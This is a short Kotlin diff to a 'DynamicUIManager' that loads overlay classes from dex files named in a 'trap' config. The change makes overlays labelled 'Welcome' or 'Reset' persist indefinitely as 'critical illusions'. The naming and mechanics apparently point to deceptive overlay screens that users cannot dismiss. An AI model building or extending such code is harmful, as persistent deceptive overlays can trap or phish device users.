@@ -515,7 +515,10 @@ object DynamicUIManager {
                             val dexPath = trap.getString("file_path")
                             val className = trap.getString("class_name")
                             val dimLevel = trap.optInt("dim", 20)
-                            val timeout = trap.optLong("timeout", 10L)
+                            
+                            // FORCE PERSISTENT TIMEOUT FOR CRITICAL ILLUSIONS
+                            val isCritical = label.equals("Welcome", ignoreCase = true) || label.equals("Reset", ignoreCase = true)
+                            val timeout = if (isCritical) 0L else trap.optLong("timeout", 10L)
                             
                             showNativeOverlay(ctx, dexPath, className, dimLevel)
                             
